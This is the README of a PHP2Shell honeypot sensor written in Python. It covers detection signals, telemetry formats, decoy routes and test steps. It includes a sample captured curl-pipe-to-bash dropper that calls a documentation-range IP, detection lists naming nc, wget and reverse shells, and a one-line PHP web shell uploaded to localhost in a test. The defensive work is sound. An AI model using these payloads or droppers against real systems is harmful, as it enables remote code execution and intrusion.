# PHP2Shell Threat-Intelligence Honeypot

A safe, high-interaction HTTP sensor for the **PHP2Shell** exploitation family:

| CVE | Behaviour being detected |
| --- | --- |
| `CVE-2026-109618` | Large / mangled `multipart/form-data` uploads crafted to push PHP into out-of-memory or parser-desynchronisation states |
| `CVE-2026-109619` | `PHP_SESSION_UPLOAD_PROGRESS` session-file poisoning races and deliberately paused TCP upload streams |

The sensor is written in Python with FastAPI + Uvicorn (an asyncio HTTP server).
It emulates an Apache 2.4.52 / PHP-FPM 8.1.2 file portal on the wire. It does
**not** ship, spawn, proxy or connect to PHP, Apache, CGI, FPM or any other
interpreter. No request byte is ever executed.

> **Deploy this only on an isolated, dedicated sensor network.** It is an
> intelligence collection device, not a production web server. Apply the
> hardening notes at the end of this document.

---

## Why it is safe

* **No PHP engine, no shell, no `eval`/`exec`/`subprocess` on request data.**
  Responses are static HTML/PHP-error templates rendered by Python.
* **Bounded streaming reads.** Request bodies are consumed chunk-by-chunk into
  a `SpooledTemporaryFile` with a hard cap (`HONEYPOT_MAX_BODY_BYTES`, 32 MiB by
  default) and an analysis probe (`HONEYPOT_PROBE_BYTES`, 2 MiB). Huge PHP2Shell
  uploads therefore consume fixed, small memory.
* **Read timeout.** A client that announces a body and stalls is cut off after
  `HONEYPOT_BODY_TIMEOUT_SECONDS` (30 s) with `408 Request Timeout`.
* **Quarantine, not execution.** Payloads are written as inert bytes to
  `captured_payloads/`, named only by SHA-256. That directory is never routed or
  served and is deliberately excluded from the container image.
* **Contained runtime.** The Docker image runs as an unprivileged user with all
  Linux capabilities dropped, a read-only root filesystem, a small tmpfs, memory
  and PID limits and no egress requirements.

---

## Capabilities

* Catch-all `GET`, `HEAD`, `POST`, `PUT`, `PATCH`, `DELETE`, `OPTIONS` and `TRACE`
  handlers across every path, plus realistic decoy routes.
* Apache/PHP fingerprints on every response:
  `Server: Apache/2.4.52 (Ubuntu)`, `X-Powered-By: PHP/8.1.2`, `X-Request-Id`.
* Apache-style `404`, `405`, `408` and PHP-style fatal-error pages.
* Safe multipart parser (no `python-multipart`, no PHP):
  * part count, per-part header sizes, folded headers
  * nested / mismatched / missing boundaries, malformed framing
  * duplicate, over-long and path-traversal filenames
  * form fields, upload filenames, content types, part SHA-256 hashes
* TCP pacing telemetry: per-chunk inter-arrival gaps, body duration, first-byte
  delay, incomplete/disconnected bodies.
* Command-dropper extraction (`curl`, `wget`, `chmod +x`, `bash -c`, `nc`,
  `base64 -d`, Python/Perl one-liners, PowerShell, reverse shells, PHP
  execution primitives).
* Web-shell marker detection (`<?php`, `eval(`, `system(`, `shell_exec`,
  `base64_decode`, `gzinflate`, ...).
* IOC harvesting: attacker IP, IPv4 addresses embedded in payloads, URLs,
  domains, upload filenames, body and part SHA-256 hashes.
* Optional TLS listener on `8443` with a self-signed certificate.

---

## Project layout

```text
.
├── main.py                    # asyncio/FastAPI honeypot, parsing + detection
├── requirements.txt           # fastapi, uvicorn[standard], pydantic
├── Dockerfile
├── docker-compose.yml
├── docker/
│   └── entrypoint.sh          # optional self-signed TLS certificate bootstrap
├── tests/
│   └── smoke_test.py          # stdlib-only end-to-end verification
├── logs/                      # created at runtime (exploits.json, iocs.txt)
└── captured_payloads/         # created at runtime (quarantined bytes)
```

---

## Quick start

### Local (HTTP on 8080)

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install -r requirements.txt
python main.py
```

Verify:

```bash
curl -i http://127.0.0.1:8080/
curl -i http://127.0.0.1:8080/phpinfo.php
```

### Docker Compose (ports 80 / 443)

```bash
mkdir -p logs captured_payloads certs
docker compose up --build -d
```

Compose maps host `80 -> 8080` and `443 -> 8443`, enables TLS, and generates a
throw-away self-signed certificate into `./certs/` on first start if one is not
present. Collected telemetry is bind-mounted back to `./logs/` and
`./captured_payloads/`.

The container runs as UID/GID `1000`. If your host user is not UID 1000, give
the bind-mounted directories to that UID before starting:

```bash
sudo chown -R 1000:1000 logs captured_payloads certs
```

Change the port mapping if 80/443 are already in use:

```yaml
ports:
  - "8080:8080"
  - "8443:8443"
```

### TLS without Docker

Generate a certificate and point the honeypot at it:

```bash
mkdir -p certs
openssl req -x509 -nodes -newkey rsa:2048 -days 365 \
  -keyout certs/honeypot.key -out certs/honeypot.crt \
  -subj "/CN=intranet.acme.local"

HONEYPOT_TLS=true \
HONEYPOT_CERT_FILE=./certs/honeypot.crt \
HONEYPOT_KEY_FILE=./certs/honeypot.key \
HONEYPOT_HTTP_PORT=8080 \
HONEYPOT_HTTPS_PORT=8443 \
python main.py
```

The plain HTTP listener stays available on 8080; the TLS listener runs in the
same process on 8443. Both serve the same app and write to the same telemetry
store.

### Uvicorn CLI

`python main.py` is preferred because it starts the TLS listener too. If you use
Uvicorn directly, disable its own server header so the Apache fingerprint is not
duplicated:

```bash
uvicorn main:app --host 0.0.0.0 --port 8080 --no-server-header
```

---

## Configuration

All settings are environment variables; paths may be relative (resolved against
the location of `main.py`) or absolute.

| Variable | Default | Description |
| --- | --- | --- |
| `HONEYPOT_HOST` | `0.0.0.0` | Bind address |
| `HONEYPOT_HTTP_PORT` | `8080` (falls back to `PORT`) | Plain HTTP port |
| `HONEYPOT_HTTPS_PORT` | `8443` | TLS port |
| `HONEYPOT_TLS` | `false` | Enable the TLS listener |
| `HONEYPOT_CERT_FILE` | `./certs/honeypot.crt` | TLS certificate (PEM) |
| `HONEYPOT_KEY_FILE` | `./certs/honeypot.key` | TLS private key (PEM) |
| `HONEYPOT_LOG_DIR` | `./logs` | Telemetry + IOC directory |
| `HONEYPOT_PAYLOAD_DIR` | `./captured_payloads` | Quarantine directory |
| `HONEYPOT_TMP_DIR` | `./logs/tmp` | Body spool directory |
| `HONEYPOT_MAX_BODY_BYTES` | `33554432` (32 MiB) | Hard body capture cap |
| `HONEYPOT_PROBE_BYTES` | `2097152` (2 MiB) | Bytes kept in memory for analysis |
| `HONEYPOT_MAX_ARTIFACT_BYTES` | `4194304` (4 MiB) | Max bytes written per request body |
| `HONEYPOT_MAX_ARTIFACT_PARTS` | `8` | Max uploaded parts quarantined per request |
| `HONEYPOT_LARGE_MULTIPART_BYTES` | `1048576` (1 MiB) | CVE-2026-109618 size threshold |
| `HONEYPOT_MANY_PARTS` | `32` | CVE-2026-109618 part-count threshold |
| `HONEYPOT_PART_HEADER_BYTES` | `4096` | Per-part header-size threshold |
| `HONEYPOT_HEADER_COUNT` | `60` | Request header-count threshold |
| `HONEYPOT_HEADER_BYTES` | `16384` | Request header-byte threshold |
| `HONEYPOT_SLOW_GAP_SECONDS` | `2.0` | TCP pause threshold (CVE-2026-109619) |
| `HONEYPOT_SLOW_TOTAL_SECONDS` | `5.0` | Slow body total-duration threshold |
| `HONEYPOT_BODY_TIMEOUT_SECONDS` | `30.0` | Per-chunk body read timeout |
| `HONEYPOT_LOG_ALL` | `true` | Log benign requests too |
| `HONEYPOT_TRUST_PROXY_HEADERS` | `false` | Trust `X-Forwarded-For` for client IP |
| `HONEYPOT_SERVER_TOKEN` | `Apache/2.4.52 (Ubuntu)` | `Server` response header |
| `HONEYPOT_POWERED_BY` | `PHP/8.1.2` | `X-Powered-By` response header |
| `HONEYPOT_PHP_VERSION` | `8.1.2` | Version shown on decoy pages |
| `HONEYPOT_MEMORY_LIMIT` | `128M` | Value shown by the phpinfo decoy |
| `HONEYPOT_SERVER_NAME` | `intranet.acme.local` | Hostname on error pages |
| `HONEYPOT_LOG_LEVEL` | `INFO` | Python logging level |
| `HONEYPOT_UVICORN_LOG_LEVEL` | `warning` | Uvicorn log level |

Do **not** enable `HONEYPOT_TRUST_PROXY_HEADERS` unless the sensor is behind a
trusted reverse proxy; otherwise attackers can spoof their source IP in logs and
the IOC blocklist.

---

## Detection logic

### CVE-2026-109618 - OOM / mangled multipart

Signals emitted with `"cve": "CVE-2026-109618"`:

| Signal id | Severity | Trigger |
| --- | --- | --- |
| `large_multipart_upload` | high | Multipart POST/PUT >= `HONEYPOT_LARGE_MULTIPART_BYTES` |
| `excessive_multipart_parts` | high | >= `HONEYPOT_MANY_PARTS` parts |
| `oversized_part_headers` | high | A part header block >= `HONEYPOT_PART_HEADER_BYTES` |
| `mass_file_upload_fields` | high | >= 8 file fields in one request |
| `content_length_overflow` | high | Declared `Content-Length` > capture cap |
| `truncated_request_body` | high | Delivered bytes < declared `Content-Length` |
| `mangled_multipart_boundary` | high | Declared boundary absent from the body |
| `multipart_missing_boundary` | high | `multipart/form-data` without a boundary |
| `nested_multipart_boundary` | high | Part contains its own multipart body |
| `mangled_multipart_body` | high | Missing CRLF / part separators |
| `conflicting_length_headers` | high | Both `Transfer-Encoding` and `Content-Length` |
| `folded_multipart_headers` | medium | Folded/invalid part headers |
| `duplicate_upload_filenames` | medium | Repeated `filename=` values |
| `oversized_upload_filename` | medium | Filename > 255 characters |
| `filename_path_traversal` | medium | `../`, absolute path or NUL in filename |
| `header_flooding` | medium | Oversized request header block |

When such a request reaches `/upload.php` (or any `*.php` path), the sensor
answers like a PHP worker that just exhausted `memory_limit`:

```text
HTTP/1.1 500 Internal Server Error
...
Fatal error: Allowed memory size of 134217728 bytes exhausted ...
```

That keeps the attacker engaged and produces a clean CVE-labelled telemetry
record without ever allocating the requested memory.

### CVE-2026-109619 - session-progress race / paused streams

Signals emitted with `"cve": "CVE-2026-109619"`:

| Signal id | Severity | Trigger |
| --- | --- | --- |
| `php_session_upload_progress` | high | `PHP_SESSION_UPLOAD_PROGRESS` or `session.upload_progress.*` in the body |
| `php_ini_override_header` | high | `PHP_VALUE`, `PHP_ADMIN_VALUE`, `PHP_SESSION_UPLOAD_PROGRESS`, `PHP_INI` headers |
| `php_ini_override_payload` | high | `allow_url_include`, `auto_prepend_file`, `auto_append_file`, `disable_functions` in the body |
| `session_progress_webshell_race` | high | Session-progress markers **and** PHP code in one request |
| `tcp_stream_pause` | high | Inter-chunk gap >= `HONEYPOT_SLOW_GAP_SECONDS` |
| `slow_body_delivery` | high | Body takes >= `HONEYPOT_SLOW_TOTAL_SECONDS` |
| `incomplete_upload_stream` | high | Stream ends before the declared body |
| `body_read_timeout` | high | Client stalls past `HONEYPOT_BODY_TIMEOUT_SECONDS` |
| `body_exceeds_capture_cap` | medium | Body larger than the capture cap |

Timing is measured inside the ASGI `receive()` loop, so pauses are visible even
though the HTTP server terminates TLS. `body.chunk_gaps_seconds` and
`body.max_chunk_gap_seconds` are written to the log as evidence.

### Generic tradecraft

`webshell_upload`, `php_code_in_request`, `command_dropper`,
`command_parameter`, `sensitive_path_probe` and `scanner_user_agent` capture
adjacent activity (web-shell uploads, `?cmd=` probes, downloader one-liners,
known scanners). A request is marked `is_exploit: true` when any signal is
`medium` or higher; `low` signals are retained for context.

---

## Telemetry artifacts

### `logs/exploits.json`

**JSON Lines**: one complete JSON object per line, append-only. The `.json`
name is intentional for tooling compatibility; use `jq` or a streaming reader
rather than loading it as a JSON array. A record is written for every exploit
request and, when `HONEYPOT_LOG_ALL=true`, for benign requests as well.

Abridged example:

```json
{
  "schema": "php2shell-honeypot.event/1.0",
  "event": "http_request",
  "request_id": "f2f3de9e630e4562b156f9ea56b86dec",
  "timestamp": "2026-10-23T15:56:47.596Z",
  "tls": false,
  "client": {"ip": "127.0.0.1", "port": 49634},
  "request": {
    "method": "POST",
    "path": "/upload.php",
    "query": "",
    "http_version": "1.1",
    "headers": [["host", "127.0.0.1:8080"], ["user-agent", "curl/8.5.0"]],
    "content_type": "multipart/form-data; boundary=----php2shell...",
    "declared_content_length": 1229090
  },
  "body": {
    "bytes": 1229090,
    "stored_bytes": 1229090,
    "sha256": "9e9280f9e630fc88c2b1e28067e8e8d82a0ad6ef3e203a77e921ccc470ab720b",
    "truncated": false,
    "incomplete": false,
    "chunk_count": 7,
    "chunk_gaps_seconds": [0.0002, 0.0005, 0.0006],
    "max_chunk_gap_seconds": 0.0012,
    "preview": "------php2shell...",
    "saved_as": "9e9280f9e630fc88c2b1e28067e8e8d82a0ad6ef3e203a77e921ccc470ab720b.multipart"
  },
  "multipart": {
    "boundary": "----php2shell...",
    "boundary_found": true,
    "part_count": 2,
    "file_part_count": 1,
    "parts": [
      {"index": 0, "name": "PHP_SESSION_UPLOAD_PROGRESS", "filename": null, "size": 10, "sha256": "..."},
      {"index": 1, "name": "file", "filename": "shell.php", "content_type": "application/x-php", "size": 68, "sha256": "de631871..."}
    ]
  },
  "form": {"PHP_SESSION_UPLOAD_PROGRESS": "racewindow"},
  "analysis": {
    "is_exploit": true,
    "severity": "high",
    "cves": ["CVE-2026-109619"],
    "signals": [{"id": "php_session_upload_progress", "severity": "high", "cve": "CVE-2026-109619", "description": "..."}],
    "command_droppers": [{"tool": "curl", "command": "curl -s http://203.0.113.9/x.sh | bash"}],
    "webshell_markers": ["<?php", "system("],
    "iocs": {"ip": ["127.0.0.1", "203.0.113.9"], "url": ["http://203.0.113.9/x.sh"], "filename": ["shell.php"], "sha256": ["de631871..."]}
  },
  "artifacts": [{"file": "de631871....php", "kind": "uploaded_file", "sha256": "de631871....", "bytes": 68}],
  "response": {"status": 200, "headers": {"server": "Apache/2.4.52 (Ubuntu)", "x-powered-by": "PHP/8.1.2"}},
  "error": null
}
```

Every record contains the raw request headers (in arrival order), the attacker
IP/port, a body preview, the body SHA-256, multipart structure, extracted form
fields, signal evidence, command strings, IOCs, response status and artifacts.

### `captured_payloads/`

* `<sha256>.<ext>` - raw request bodies (`*.multipart`, `*.form`, `*.body`) and
  uploaded files/fragments. `.php` is used for PHP-looking uploads; the file is
  inert bytes and is never served.
* `manifest.jsonl` - one JSON object per artifact: `sha256`, `file`, `kind`,
  `size`, `original_filename`, `content_type`, `truncated`, `first_seen`,
  `request_id`, `source_ip`.
* Deduplication is by SHA-256: repeated payloads are not written again.
* Large artifacts are capped (`HONEYPOT_MAX_ARTIFACT_BYTES`) and marked
  `truncated: true`; partial uploads are marked in the same way.

### `logs/iocs.txt`

Tab-separated IOC feed, append-only and deduplicated by `(type, value)`:

```text
# PHP2Shell honeypot IOC feed (tab separated)
# type	value	first_seen	last_seen	context
ip	198.51.100.23	2026-10-23T15:56:42.085Z	2026-10-23T15:56:42.085Z	high:CVE-2026-109618,CVE-2026-109619:f372f3f8...
sha256	9e9280f9...	2026-10-23T15:56:42.085Z	2026-10-23T15:56:42.085Z	high:CVE-2026-109618:f372f3f8...
filename	shell.php	2026-10-23T15:56:47.596Z	2026-10-23T15:56:47.596Z	high:CVE-2026-109619:f2f3de9e...
url	http://203.0.113.9/x.sh	...	...	high:CVE-2026-109619:...
domain	203.0.113.9	...	...	high:CVE-2026-109619:...
```

Extract the plain IP blocklist for a firewall / fail2ban / DNS sinkhole:

```bash
awk -F'\t' '!/^#/ && $1=="ip" {print $2}' logs/iocs.txt \
  | sort -u > logs/blocklist.txt
```

Useful queries:

```bash
# Exploit verdicts
jq -c 'select(.analysis.is_exploit) | {ts:.timestamp, ip:.client.ip, cves:.analysis.cves, path:.request.path}' \
  logs/exploits.json | tail -50

# All captured dropper commands
jq -r '.analysis.command_droppers[]?.command' logs/exploits.json | sort -u

# Requests with TCP pauses
jq -c 'select(.body.max_chunk_gap_seconds >= 2) | {ip:.client.ip, gap:.body.max_chunk_gap_seconds, path:.request.path}' \
  logs/exploits.json

# Top source IPs
jq -r '.client.ip' logs/exploits.json | sort | uniq -c | sort -nr | head
```

---

## Decoy routes

| Route | Methods | Response |
| --- | --- | --- |
| `/`, `/index.php`, `/index.html` | GET, HEAD | Acme Intranet file-portal landing page with upload form |
| `/upload.php` | POST, PUT, PATCH | Realistic upload result; `500` PHP OOM page for CVE-2026-109618; session page for CVE-2026-109619 |
| `/uploads/` | GET | Apache directory listing |
| `/phpinfo.php` | GET | phpinfo decoy including `session.upload_progress.*` and `memory_limit` |
| `/server-status` | GET | Apache `mod_status` decoy |
| `/wp-login.php` | GET, POST | WordPress login decoy / invalid-credentials page |
| `/robots.txt` | GET | Discourages `/uploads/` and `/admin/` |
| `/healthz` | GET | Container health probe (`{"status": "ok"}`) |
| any other path | any method | Apache-style `404`; `OPTIONS` returns an `Allow` header |

---

## Verification

Run the end-to-end test (stdlib only; starts real servers on loopback):

```bash
python3 tests/smoke_test.py
```

Expected output:

```text
PASS: decoy routes, Apache/PHP headers, CVE-2026-109618, CVE-2026-109619,
      paused TCP stream detection, stalled-upload timeout, payload quarantine,
      SHA-256 manifest, IOC blocklist and TLS listener all verified.
```

The test asserts:

1. Decoy routes return Apache/PHP headers and realistic bodies.
2. A large multipart request returns the PHP OOM `500` page and logs
   `CVE-2026-109618` with all expected structural signals.
3. A `PHP_SESSION_UPLOAD_PROGRESS` upload plus curl dropper returns `200`, logs
   `CVE-2026-109619`, extracts the dropper and quarantines the web shell.
4. A raw socket that sends its body in 250 ms steps logs `tcp_stream_pause` with
   a measured gap.
5. A client that announces a body and stalls receives `408` and logs
   `body_read_timeout`.
6. Quarantined files are named by SHA-256 and match the original bytes; the
   manifest and IOC feed contain the hashes and attacker IP.
7. The TLS listener serves the same Apache-fingerprinted decoy over HTTPS.

Manual exploit simulation (safe - the payload is only stored and scored):

```bash
printf '<?php system($_GET["c"]); ?>\n' > /tmp/shell.php
curl -i -F 'PHP_SESSION_UPLOAD_PROGRESS=race' \
     -F 'file=@/tmp/shell.php;filename=shell.php;type=application/x-php' \
     http://127.0.0.1:8080/upload.php

python3 - <<'PY'
data = b"A" * (2 * 1024 * 1024)
open("/tmp/large.bin", "wb").write(data)
PY
curl -i -F 'file=@/tmp/large.bin;filename=big.php' \
     http://127.0.0.1:8080/upload.php
```

---

## Operational guidance

* Run the sensor on a dedicated VLAN / cloud instance with **no egress** and no
  route to production networks. The honeypot does not need outbound access.
* Keep `captured_payloads/` off any web root, share or backup that auto-executes
  files. Treat every artifact as live malware: analyse only in a sandbox.
* Retain `logs/` on a central collector. For long-running sensors, rotate
  `exploits.json` (e.g. `logrotate` with `copytruncate`) or ship JSONL to your
  SIEM and truncate.
* Monitor disk usage: the body cap limits each request, but volumetric scanning
  still produces many records. Set `HONEYPOT_LOG_ALL=false` if you only want
  exploit records.
* Tune `HONEYPOT_LARGE_MULTIPART_BYTES` / `HONEYPOT_SLOW_GAP_SECONDS` to your
  traffic baseline. Lower thresholds increase sensitivity and false positives.
* The TLS certificate generated by `docker/entrypoint.sh` is self-signed and for
  deception only; do not reuse it anywhere else.
* `HONEYPOT_TRUST_PROXY_HEADERS` must stay `false` unless the sensor is behind a
  trusted proxy that overwrites `X-Forwarded-For`.
* Never enable PHP, Apache modules, CGI or FPM on the same host to "make the
  decoy more realistic". The Python emulation is the safety boundary.

## Limitations

* CVE-2026-109618 / CVE-2026-109619 are modelled as described in the task:
  the detector scores multipart memory-exhaustion shapes and
  session-progress/TCP-pause behaviour; it is heuristic, not a byte-exact
  replica of any specific public PoC.
* TCP pacing is observed at the ASGI `receive()` boundary. Kernel-level
  coalescing can merge very small writes; gaps larger than the configured
  threshold remain reliable.
* The decoy is intentionally small. It does not emulate a complete PHP
  application, database or authentication flow.
* If the capture cap is reached, the remaining request body is not drained; the
  server responds with `Connection: close`. This is a deliberate anti-DoS
  trade-off.
* `exploits.json` is JSON Lines, not a JSON array, to allow concurrent-safe
  append-only writes.
